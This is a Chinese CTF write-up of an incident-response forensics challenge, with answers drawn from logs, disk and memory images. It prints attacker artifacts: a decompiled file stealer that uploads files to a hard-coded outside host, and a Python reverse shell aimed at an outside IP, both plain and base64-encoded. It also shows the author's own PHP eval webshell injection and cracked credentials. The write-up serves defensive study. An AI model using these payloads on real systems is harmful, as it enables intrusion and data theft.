<hr>
<p>title: 第一届帕鲁杯-CTF应急响应挑战赛部分wp<br>date: 2024-04-19 13:40:17<br>tags:<br>updated:<br>categories:<br>keywords:<br>description:<br>top_img: /images/第一届帕鲁杯-CTF应急响应挑战赛部分wp/image-20240423085916686.png<br>comments:<br>cover: /images/第一届帕鲁杯-CTF应急响应挑战赛部分wp/image-20240423085916686.png<br>toc:<br>toc_number:<br>copyright:<br>copyright_author:<br>copyright_author_href:<br>copyright_url:<br>copyright_info:<br>mathjax:<br>katex:<br>aplayer:<br>highlight_shrink:<br>aside:</p>
<hr>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240423085916686.png" alt="image-20240423085916686"></p>
<p>赛题：<a href="https://pan.baidu.com/s/1NtC9RkO2MgG__oTffWYiRw?pwd=kc2y">https://pan.baidu.com/s/1NtC9RkO2MgG__oTffWYiRw?pwd=kc2y</a></p>
<p>赛题文件：<img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%A8%A1%E5%9D%97%20%E8%AF%B4%E6%98%8E%E6%89%8B%E5%86%8C.pdf" alt="应急响应模块说明手册.pdf ">应急响应模块说明手册.pdf </p>
<h2 id="应急响应-1"><a href="#应急响应-1" class="headerlink" title="应急响应-1"></a>应急响应-1</h2><p><strong>题目要求：</strong><br>找到JumpServer堡垒机中flag标签的值。</p>
<hr>
<p><strong>提交格式：</strong><br>[堡垒机中flag标签的值]</p>
<p>登上jumpserver就可以了<br>点控制台的更多选项里面有个标签值即可</p>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240419135123741.png" alt="image-20240419135123741"></p>
<h2 id="应急响应-2"><a href="#应急响应-2" class="headerlink" title="应急响应-2"></a>应急响应-2</h2><p><strong>题目要求：</strong><br>提交攻击者第一次登录时间。</p>
<hr>
<p><strong>提交格式：</strong><br>[2024/00/00/00:00:00]<br>找到日志审计，查看登录日志，选一下时间，近一年的，</p>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422091737237.png" alt="image-20240422091737237"></p>
<p>ip为192.168.20.123的时间</p>
<blockquote>
<p>flag : [2024/04/11/14:21:18]</p>
</blockquote>
<h2 id="应急响应-3"><a href="#应急响应-3" class="headerlink" title="应急响应-3"></a>应急响应-3</h2><p><strong>题目要求：</strong><br>提交攻击者源IP。</p>
<hr>
<p><strong>提交格式：</strong><br>[0.0.0.0]</p>
<p>因为后面test01的用户执行了jump server的rce，可能是nat转过来的</p>
<blockquote>
<p>flag:192.168.1.4</p>
</blockquote>
<h2 id="应急响应-4"><a href="#应急响应-4" class="headerlink" title="应急响应-4"></a>应急响应-4</h2><p><strong>题目要求：</strong><br>提交攻者使用的cve编号。</p>
<hr>
<p><strong>提交格式：</strong><br>[CVE-0000-0000]</p>
<p>在审计台的日志审计中，有一个作业日志</p>
<p>test执行了两个rce</p>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422092914024.png" alt="image-20240422092914024"></p>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422093117730.png" alt="image-20240422093117730"></p>
<p>有两个，都试一下</p>
<blockquote>
<p>flag: CVE-2024-29201</p>
</blockquote>
<h2 id="应急响应-5"><a href="#应急响应-5" class="headerlink" title="应急响应-5"></a>应急响应-5</h2><p><strong>题目要求：</strong><br>提交攻击者留在Web服务器上的恶意程序的32位小写md5值。</p>
<hr>
<p><strong>提交格式：</strong><br>[xxxxxx]</p>
<p>由题意可知，web服务器在 192.168.20.121上面，但是 192.168.20.121的服务器账号密码是没有给的我们可以在jump上面看一下历史命令，在资产列表里面登录，看历史命令，搜一下passwd shadow等等</p>
<p>第一条可以看到palu.com的hash等等<img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422095000280.png" alt="image-20240422095000280"></p>
<p>但是这个palu.com的hash不全，裂开<br>我们这里其实可以直接用diskgeninus将server的盘导进来，直接看文件<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422113122397.png" alt="image-20240422113122397"></p>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422113314688.png" alt="image-20240422113314688"></p>
<p>直接跑hash,palu.com/123123<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422134343810.png" alt="image-20240422134343810"></p>
<p>webserver上有计算过home文件</p>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422134415059.png" alt="image-20240422134415059"></p>
<p>在root下面也可以找到home文件，计算一下即可</p>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422135155298.png" alt="image-20240422135155298"></p>
<p>这里知道账号密码直接ssh连上来，在222端口</p>
<blockquote>
<p>flag:84413332e4e7138adc5d6f1f688ddd69</p>
</blockquote>
<h2 id="应急响应-6427-pts"><a href="#应急响应-6427-pts" class="headerlink" title="应急响应-6427 pts"></a>应急响应-6427 pts</h2><p><strong>题目要求：</strong><br>分析恶意程序连接地址和密码。</p>
<hr>
<p><strong>提交格式：</strong><br>[md5(地址)-md5(密码)] md5值为全小写32位长度</p>
<p>抄人家的wp发现是一个python的linux文件</p>
<pre><code class="python"># Source Generated with Decompyle++
# File: palucomeyi1.pyc (Python 3.10)

import os
import paramiko
from getpass import getpass

def search_in_files(directory, search_text):
    pass
# WARNING: Decompyle incomplete


def ssh(local_file_path, remote_file_path):
    hostname = &#39;82.157.238.111&#39;
    port = 22
    username = &#39;root&#39;
    password = &#39;1qaz@WSX3edc&#39;
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(hostname, port, username, password)
    sftp = client.open_sftp()
    sftp.put(local_file_path, remote_file_path)
    sftp.close()
    client.close()
    print(f&#39;&#39;&#39;File {local_file_path} uploaded to {remote_file_path} on {hostname}&#39;&#39;&#39;)

search_directory = &#39;/&#39;
search_for_text = &#39;passwod&#39;
(a, b) = search_in_files(search_directory, search_for_text)
ssh(a, b)
</code></pre>
<blockquote>
<p>82.157.238.111 1qaz@WSX3edc</p>
</blockquote>
<h2 id="应急响应-7"><a href="#应急响应-7" class="headerlink" title="应急响应-7"></a>应急响应-7</h2><p><strong>题目要求：</strong><br>提交存在反序列化漏洞的端口。</p>
<hr>
<p><strong>提交格式：</strong><br>[md5(端口)]</p>
<p>登录雷池的waf可以看到fastjson的端口</p>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422100949500.png" alt="image-20240422100949500"></p>
<p>上游地址是8080，映射到雷池的7878，所以本身是8080端口</p>
<blockquote>
<p>flag:8080的md5</p>
</blockquote>
<h2 id="应急响应-8"><a href="#应急响应-8" class="headerlink" title="应急响应-8"></a>应急响应-8</h2><p><strong>题目要求：</strong><br>提交攻击者使用的后门路由地址。</p>
<hr>
<p><strong>提交格式：</strong><br>[md5(/api/xxx)]<br>我们在jump上翻一翻，可以看到有一个log.txt，也是不全的，当时做题的时候，没有webserver的密码，那么就看不了<br>翻那个waf的时候，可以看到有命令执行的后门，然后索性，把雷池waf所有的安全都关掉，直接写个马进去，连上，直接翻log的txt就可以了。当然，这样肯定不是预期解。<br><code>?123=system(&quot;echo &#39;&lt;?php eval(\$_POST[1]); ?&gt;&#39; &gt; a.php&quot;);</code><br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422101901120.png" alt="image-20240422101901120"></p>
<p>可以看到文件名为flask，那么可能就是py文件了<br>全盘搜，没有搜到，应该是删了<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422102029282.png" alt="image-20240422102029282"></p>
<p>回到jump里面搜命令，可以看到有接口system</p>
<blockquote>
<p>flag:/api/system的md5</p>
</blockquote>
<h2 id="应急响应-9"><a href="#应急响应-9" class="headerlink" title="应急响应-9"></a>应急响应-9</h2><p><strong>题目要求：</strong><br>提交dnslog反弹域名。</p>
<hr>
<p><strong>提交格式：</strong><br>[md5(域名)]</p>
<p>log日志中有</p>
<blockquote>
<p>flag:0vqkht.dnslog.cn</p>
</blockquote>
<h2 id="应急响应-10"><a href="#应急响应-10" class="headerlink" title="应急响应-10"></a>应急响应-10</h2><p><strong>题目要求：</strong><br>提交第一次扫描器使用时间。</p>
<hr>
<p><strong>提交格式：</strong><br>[2024/00/00/00:00:00]</p>
<p>这里第一次扫描器的时间，感觉是<br> 2024/04/17 08:59:18</p>
<p> 2024/04/17 08:59:00<br>这两个，为什么呢</p>
<table>
<thead>
<tr>
<th>./fscan -h 192.168.20.0/24</th>
<th>接受</th>
<th>Administrator(admin)</th>
<th>192.168.1.4</th>
<th>WebServer(192.168.20.121)</th>
<th>home(home)</th>
<th>转到</th>
<th>2024/04/17 08:59:18</th>
</tr>
</thead>
<tbody><tr>
<td>`$ ./fscan  -h 192.168.20.0/24 ./fscan  -h 192.168.20.0/24   ___                              _      / _ \     ___  ___ _ __ __ _  ___</td>
<td></td>
<td>__  / /<em>/</em>___/ __</td>
<td>/ __</td>
<td>‘__/ _<code> |/ __| |/ / / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     \____/     |___/\___|_|  \__,_|\___|_|\_\                        fscan version: 1.8.3 start infoscan (icmp) Target 192.168.20.121  is alive (icmp) Target 192.168.20.2    is alive (icmp) Target 192.168.20.1    is alive (icmp) Target 192.168.20.11   is alive (icmp) Target 192.168.20.51   is alive (icmp) Target 192.168.20.52   is alive (icmp) Target 192.168.20.123  is alive [*] Icmp alive hosts len is: 7</code></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>./fscan</th>
<th>接受</th>
<th>Administrator(admin)</th>
<th>192.168.1.4</th>
<th>WebServer(192.168.20.121)</th>
<th>home(home)</th>
<th>转到</th>
<th>2024/04/17 08:59:00</th>
</tr>
</thead>
<tbody><tr>
<td>`$ ./fscan ./fscan    ___                              _      / _ \     ___  ___ _ __ __ _  ___</td>
<td></td>
<td>__  / /<em>/</em>___/ __</td>
<td>/ __</td>
<td>‘__/ _<code> |/ __| |/ / / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     \____/     |___/\___|_|  \__,_|\___|_|\_\                    fscan version: 1.8.3 Host is none Usage of ./fscan:  -br int Brute threads (default 1)  -c string exec command (ssh|wmiexec)  -cookie string set poc cookie,-cookie rememberMe=login  -debug int every time to LogErr (default 60)  -dns using dnslo...c  -domain string smb domain  -full</code></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>00那个是执行了fscan，19那个是扫了，不知道是哪一个，也有可能就不是fscan这个扫描器，是waf那边的，但是也不是，回头看看wp</p>
<p>果然，不是这个fscan的，是flask的日志</p>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422111931975.png" alt="image-20240422111931975"></p>
<p>19结尾就是，算一下</p>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422112133952.png" alt="image-20240422112133952"></p>
<blockquote>
<p>flag:[2024/04/15/02:26:59]</p>
</blockquote>
<h2 id="应急响应-11"><a href="#应急响应-11" class="headerlink" title="应急响应-11"></a>应急响应-11</h2><p><strong>题目要求：</strong><br>提交攻击者反弹shell使用的语言。</p>
<hr>
<p><strong>提交格式：</strong><br>[md5(c++&amp;java)]均为小写</p>
<p>往下滑，python的</p>
<p>1713120249.5091295—–import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((‘82.157.238.174’,7890));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(‘sh’)<br>1713120301.6446397—–pcntl_exec(‘/usr/bin/python’,[‘-c’,base64_decode(‘aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjgyLjE1Ny4yMzguMTc0Iiw3ODkwKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigic2giKQ==’)]);</p>
<blockquote>
<p>flag:python</p>
</blockquote>
<h2 id="应急响应-12"><a href="#应急响应-12" class="headerlink" title="应急响应-12"></a>应急响应-12</h2><p><strong>题目要求：</strong><br>提交攻击者反弹shell的ip。</p>
<hr>
<p><strong>提交格式：</strong><br>[xxx.xxx.xxx.xxx]</p>
<p>解一下base64<br>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“82.157.238.174”,7890));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(“sh”)</p>
<blockquote>
<p>flag:82.157.238.174</p>
</blockquote>
<h2 id="应急响应-13"><a href="#应急响应-13" class="headerlink" title="应急响应-13"></a>应急响应-13</h2><p><strong>题目要求：</strong><br>提交攻击者留下的账号。</p>
<hr>
<p><strong>提交格式：</strong><br>[xxxxx]</p>
<p>攻击者的账号已经看到了，就是palu.com</p>
<blockquote>
<p>flag:palu.com</p>
</blockquote>
<h2 id="应急响应-14"><a href="#应急响应-14" class="headerlink" title="应急响应-14"></a>应急响应-14</h2><p><strong>题目要求：</strong><br>提交攻击者的后门账户密码。</p>
<hr>
<p><strong>提交格式：</strong><br>[md5(password)]</p>
<p>密码这里已经知道了，我用hashcat没有跑出来，john出来的</p>
<blockquote>
<p>123123</p>
</blockquote>
<h2 id="应急响应-15"><a href="#应急响应-15" class="headerlink" title="应急响应-15"></a>应急响应-15</h2><p><strong>题目要求：</strong><br>提交测试数据条数。</p>
<hr>
<p><strong>提交格式：</strong><br>[md5(xxx)]</p>
<p>这里测试数据竟然是注册的数据，裂开，交代的不清楚<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422140416744.png" alt="image-20240422140416744"></p>
<blockquote>
<p>flag:5</p>
</blockquote>
<h2 id="应急响应-16"><a href="#应急响应-16" class="headerlink" title="应急响应-16"></a>应急响应-16</h2><p><strong>题目要求：</strong><br>请提交攻击者留下的信息。</p>
<hr>
<p><strong>提交格式：</strong><br>flag{xxx}</p>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422103647429.png" alt="image-20240422103647429"></p>
<p>我们搜vim的话，有一个hacktext，<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422104039978.png" alt="image-20240422104039978"></p>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422104107182.png" alt="image-20240422104107182"></p>
<blockquote>
<p>flag:flag{hi_palu_f10g}</p>
</blockquote>
<h2 id="应急响应-17"><a href="#应急响应-17" class="headerlink" title="应急响应-17"></a>应急响应-17</h2><p><strong>题目要求：</strong><br>请提交运维服务器上的恶意文件md5（小写32位md5值）。</p>
<hr>
<p><strong>提交格式：</strong><br>[xxxx]</p>
<p>jump上面的命令执行很少，<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422104508097.png" alt="image-20240422104508097"></p>
<p>有个helloworld<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422104629194.png" alt="image-20240422104629194"></p>
<blockquote>
<p>0fca0f847a45401c878d7a5303ddc1f8</p>
</blockquote>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422104730373.png" alt="image-20240422104730373"></p>
<h2 id="应急响应-18"><a href="#应急响应-18" class="headerlink" title="应急响应-18"></a>应急响应-18</h2><p><strong>题目要求：</strong><br>提交恶意文件的恶意函数。</p>
<hr>
<p><strong>提交格式：</strong><br>[md5(恶意函数)]</p>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422105456764.png" alt="image-20240422105456764"></p>
<p>sftp不好用，直接python开一个下载一下<br>托ida看一下，<img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422105643050.png" alt="image-20240422105643050"> begingame()</p>
<blockquote>
<p>flag:ddd0599cda1fc289a617db148d75383b</p>
</blockquote>
<h2 id="应急响应-19"><a href="#应急响应-19" class="headerlink" title="应急响应-19"></a>应急响应-19</h2><p><strong>题目要求：</strong><br>请提交攻击者恶意注册的恶意用户条数。</p>
<hr>
<p><strong>提交格式：</strong><br>[md5(x)]</p>
<p>根据文件找到数据库为mysql01，select * from pre_ucenter_members ;</p>
<p>查一下用户，是kongzi的这些<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422141428970.png" alt="image-20240422141428970"></p>
<blockquote>
<p>flag : 10</p>
</blockquote>
<h2 id="应急响应-20"><a href="#应急响应-20" class="headerlink" title="应急响应-20"></a>应急响应-20</h2><p><strong>题目要求：</strong><br>请提交对博客系统的第一次扫描时间。</p>
<hr>
<p><strong>提交格式：</strong><br>[2024/00/00/00:00:00]</p>
<p>博客的映射端口为80，</p>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422110228519.png" alt="image-20240422110228519"></p>
<p>筛选一下，我可以看到扫描的日志，<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422110536928.png" alt="image-20240422110536928"></p>
<p>w攻击事件中也可以看到，拦截了3.6k,就是扫描了，其他的也有一些扫描，但不是在blog的。</p>
<blockquote>
<p>2024-04-16 21:03:46</p>
</blockquote>
<h2 id="应急响应-21"><a href="#应急响应-21" class="headerlink" title="应急响应-21"></a>应急响应-21</h2><p><strong>题目要求：</strong><br>提交攻击者下载的文件。</p>
<hr>
<p><strong>提交格式：</strong><br>[xxxx.xxx]</p>
<p>在html目录下有一个upload.zip，日志中也可以看到</p>
<blockquote>
<p>flag:upload.zip</p>
</blockquote>
<h2 id="应急响应-22"><a href="#应急响应-22" class="headerlink" title="应急响应-22"></a>应急响应-22</h2><p><strong>题目要求：</strong><br>请提交攻击者第一次下载服务器文件的时间。</p>
<hr>
<p><strong>提交格式：</strong><br>[xx/Apr/2024:xx:xx:xx]</p>
<p>[2024/04/16/21:03:46]</p>
<p>我们将access5的日志下载下来看一下</p>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422142210985.png" alt="image-20240422142210985"></p>
<p>然后搜一下upload。zip<br>192.168.20.121:80 192.168.20.123 - - [16/Apr/2024:09:03:52 -0400] “GET /upload.zip HTTP/1.1” 206 8387 “-“ “Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0”</p>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422142301560.png" alt="image-20240422142301560"></p>
<blockquote>
<p>flag:[16/Apr/2024:09:03:52]</p>
</blockquote>
<h2 id="应急响应-23"><a href="#应急响应-23" class="headerlink" title="应急响应-23"></a>应急响应-23</h2><p><strong>题目要求：</strong><br>请提交攻击者留下的冰蝎马的文件名称。</p>
<hr>
<p><strong>提交格式：</strong><br>[xxxx]<br>筛选一下时间，可以看到一个</p>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422111019091.png" alt="image-20240422111019091"></p>
<p>jump里面也有</p>
<blockquote>
<p>flag:nidewen.php</p>
</blockquote>
<h2 id="应急响应-24"><a href="#应急响应-24" class="headerlink" title="应急响应-24"></a>应急响应-24</h2><p><strong>题目要求：</strong><br>提交冰蝎的链接密码。</p>
<hr>
<p><strong>提交格式：</strong><br>[xxx]</p>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422111427463.png" alt="image-20240422111427463"></p>
<p>直接让我的好大哥口算一下,就是文件名</p>
<blockquote>
<p>flag:nidewen</p>
</blockquote>
<h2 id="应急响应-25"><a href="#应急响应-25" class="headerlink" title="应急响应-25"></a>应急响应-25</h2><p><strong>题目要求：</strong><br>提交办公区存在的恶意用户名。</p>
<hr>
<p><strong>提交格式：</strong><br>[xxx]</p>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422142549715.png" alt="image-20240422142549715"></p>
<p>上来就可以看到，</p>
<blockquote>
<p>flag:hacker</p>
</blockquote>
<h2 id="应急响应-26"><a href="#应急响应-26" class="headerlink" title="应急响应-26"></a>应急响应-26</h2><p><strong>题目要求：</strong><br>提交恶意用户密码到期时间。</p>
<hr>
<p><strong>提交格式：</strong><br>[2024/xxx/xxx/xxx:xxx:xxx]</p>
<p>进去输入net user hacker即可</p>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240419144854185.png" alt="image-20240419144854185"></p>
<blockquote>
<p>flag: 2024/15/18/21:40:37</p>
</blockquote>
<h2 id="应急响应-27"><a href="#应急响应-27" class="headerlink" title="应急响应-27"></a>应急响应-27</h2><p><strong>题目要求：</strong><br>请对办公区留存的镜像取证并指出内存疑似恶意进程。</p>
<hr>
<p><strong>提交格式：</strong><br>[xxxx]</p>
<p><code>python2 vol.py -f /root/Desktop/raw.raw --profile=Win7SP1x64 pslist</code><br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422142930126.png" alt="image-20240422142930126"></p>
<blockquote>
<p>.hack.ex</p>
</blockquote>
<h2 id="应急响应-28"><a href="#应急响应-28" class="headerlink" title="应急响应-28"></a>应急响应-28</h2><p><strong>题目要求：</strong><br>请指出该员工使用的公司OA平台的密码。</p>
<hr>
<p><strong>提交格式：</strong><br>[xxxx]</p>
<p>查一下pass相关file</p>
<p><code>python2 vol.py -f /root/Desktop/raw.raw --profile=Win7SP1x64 filescan | grep pass</code><br><code>python2 vol.py -f /root/Desktop/raw.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003e296f20 -D /root/Desktop/</code></p>
<p>两个文件，提出来<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422143146132.png" alt="image-20240422143146132"></p>
<p>┌──(root㉿bohemian)-[~/Desktop]<br>└─# cat file.None.0xfffffa800ee5d530.dat<br>url: <a href="http://test.oa.com/login.html">http://test.oa.com/login.html</a><br>username: liuling<br>password: liuling7541  </p>
<blockquote>
